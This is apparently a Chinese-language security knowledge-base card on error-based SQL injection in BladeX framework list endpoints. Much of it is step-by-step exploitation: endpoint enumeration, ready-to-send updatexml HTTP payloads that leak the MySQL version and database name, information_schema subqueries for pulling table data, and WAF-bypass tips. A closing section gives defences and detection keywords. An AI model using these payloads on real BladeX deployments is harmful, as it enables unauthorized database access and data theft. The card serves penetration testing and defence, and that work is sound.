---
id: web-java-framework-bladex-role-list-updatexml-sqli
title: BladeX 角色/日志接口参数名拼接 updatexml：MySQL XPATH 报错注入回显版本
type: scenario
domain: web
path: web/java/framework
technique: bladex-query-param-updatexml-sqli
tags:
- java
- bladex
- spring-cloud
- mybatis
- sqli
- mysql
- updatexml
- error-based
- waf-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T13:43:16+08:00'
  notes: '已对照原文与 img/22、img/23 核对：error/list 的 updatexml 请求在截图中返回 XPATH syntax error: ''~8.0.20~''（LogErrorMapper），而 blade-user/page 的同类请求返回 401；文章文字称 error/list 401、称在 /api/blade-system/role/list 打通，但成功截图实际是 error/list，卡片已如实记录该文本/截图端点不一致并以响应为准。未复跑目标。'
url: /docs/web/java/framework/web-java-framework-bladex-role-list-updatexml-sqli/
draft: false
kb_aliases:
- BladeX SQL注入
- blade-system role list
- blade-log error list
- updatexml XPATH syntax error
- BladeX 1day SQL注入
- BladeX 魔改接口注入
---

## 一句话结论

BladeX 的角色/日志列表接口把请求参数拼进 SQL，且把数据库错误原样返回；向 `/api/blade-system/role/list`（以及公开 1day 的 `/api/blade-log/error/list`）提交 `updatexml(1,concat(0x7e,version(),0x7e),1)=1`，可触发 MySQL 的 `XPATH syntax error` 并回显数据库版本（案例中为 `~8.0.20~`），进一步可用同样方式逐段取库名、表名和数据。

## 原理

- 报错注入的基础：MySQL 的 `updatexml(XML_document, XPath_string, new_value)` 在第二个参数不是合法 XPath 时抛出 `XPATH syntax error: '<内容>'`，并把错误内容拼进异常消息。`concat(0x7e,version(),0x7e)` 产生 `~8.0.20~`，不是合法 XPath，于是版本号被回显。
- 触发点在参数拼接：BladeX 的查询接口把请求参数（名字或值）作为动态 SQL 片段拼进查询，未做参数名白名单或预编译。该案例把 `updatexml(1,concat(0x7e,version(),0x7e),1)=1` 整个作为查询字符串的“参数名”提交（后面跟 `=1`），接口仍将其带入 SQL，说明参数名/值被直接拼接，而不是走 `#{}` 预编译。
- 错误回显：后端未关闭详细 SQL 异常，`java.sql.SQLSyntaxErrorException` 的消息被包装进 JSON 响应的 `msg` 字段返回，构成报错型注入的 oracle。
- 端点差异：公开 1day 的 PoC 是 `/api/blade-log/error/list?updatexml(...)=1`；该案例的站点上直接访问会返回 401（另一张截图显示 `/api/blade-user/page?...` 也返回 401），作者随后枚举 `list` 类接口，称在“魔改”后的 `/api/blade-system/role/list?updatexml(...)=1` 上打通。案例截图中的成功请求行仍显示 `/api/blade-log/error/list?...`，响应包含 `XPATH syntax error: '~8.0.20~'`；文本与截图在端点上不完全一致，实际测试应以响应为准。

## 触发条件

- 目标为 BladeX，且存在会拼接请求参数的 `*/list`、`*/page` 接口。
- 数据库为 MySQL（`updatexml`/`extractvalue` 为 MySQL 函数），且 SQL 异常信息回显到 HTTP 响应。
- 接口可达；是否需要登录取决于站点改法——案例中公开 1day 端点返回 401，说明部分接口被加固或被网关拦截。
- 参数名中不能包含被 WAF/网关直接拒绝的字符，或需要按目标调整编码。

## 利用步骤

1. 先按 BladeX 指纹确认目标，收集 `/api/blade-*/*` 接口（可从 Vue 打包 JS、Burp 历史包、菜单请求中提取）。
2. 尝试公开 PoC：`GET /api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1`。
3. 若返回 401/403/404，枚举同模块其他 `list`/`page` 接口，例如 `/api/blade-system/role/list`、`/api/blade-log/api/list`、`/api/blade-user/page`，逐个在 `?` 后拼接同样的 `updatexml(...)=1`。
4. 判断成功：响应体出现 `XPATH syntax error:`，且错误内容中含 `concat` 的输出（如 `~8.0.20~`）。
5. 取数据：把 `version()` 换成 `database()`、`user()`、`@@version_comment`、`(select table_name from information_schema.tables where table_schema=database() limit 0,1)` 等；单次回显长度有限（约 32 字符），用 `substr(...,1,30)` 分段。
6. 如需自动化，用 Nuclei 模板匹配 `XPATH syntax error:`，或按响应长度/错误关键字批量筛端点；注意不要对非授权目标执行。

## PoC

公开 1day 端点：

```http
GET /api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
Host: target
```

成功响应片段：

```json
{
  "code": 500,
  "success": false,
  "msg": "### Error querying database. Cause: java.sql.SQLSyntaxErrorException: XPATH syntax error: '~8.0.20~' ..."
}
```

案例中作者称可用的“魔改”端点：

```http
GET /api/blade-system/role/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
Host: target
```

取当前库名：

```http
GET /api/blade-system/role/list?updatexml(1,concat(0x7e,database(),0x7e),1)=1 HTTP/1.1
Host: target
```

Nuclei 匹配关键字：

```yaml
matchers:
  - type: word
    part: body
    words:
      - 'XPATH syntax error:'
```

## 变体与关联

- 变体：`extractvalue(1,concat(0x7e,version()))` 同样可触发 XPATH 报错；`updatexml` 被 WAF 拦时可用十六进制/大小写/注释拆分尝试绕过。
- 变体：若接口把参数值而非参数名拼入 SQL，可把 payload 放到已知参数的值位置（如 `roleName=...`），按实际报错调整。
- 变体：除 role/log 外，其他 BladeX `list` 接口（用户、租户、字典、部门）也可能共用同一套动态查询封装，需逐个验证。
- 关联：[[web-generic-sqli-error-based-extraction]]（updatexml/extractvalue 报错注入基础）。
- 关联：[[web-generic-sqli-waf-newline-keyword-split-hex]]（关键字被拦时的绕过思路）。
- 边界：若目标关闭详细 SQL 错误或使用非 MySQL 数据库，本 payload 失效；此时尝试布尔/时间盲注或换用对应数据库的报错函数。

## 检测与防御

- 代码层：所有查询使用 MyBatis `#{}` 预编译；禁止把请求参数名/值拼进 `${}`、ORDER BY、表名/列名；动态排序字段用白名单枚举。
- 错误处理：统一异常响应，不向前端返回 SQL 异常堆栈和数据库错误信息。
- 网关/WAF：对 `updatexml`、`extractvalue`、`concat(0x7e`、`information_schema` 等特征做检测，但不要只依赖关键字黑名单。
- 接口治理：梳理并收敛 `/api/blade-*/*` 暴露面，对 `list`/`page` 接口做鉴权与参数校验。
- 检测特征：请求参数名或值中出现 `updatexml(`、`extractvalue(`、`concat(0x7e`；响应体含 `XPATH syntax error`、`SQLSyntaxErrorException`；同一会话短时间内对多个 `list` 接口做相似 fuzz。
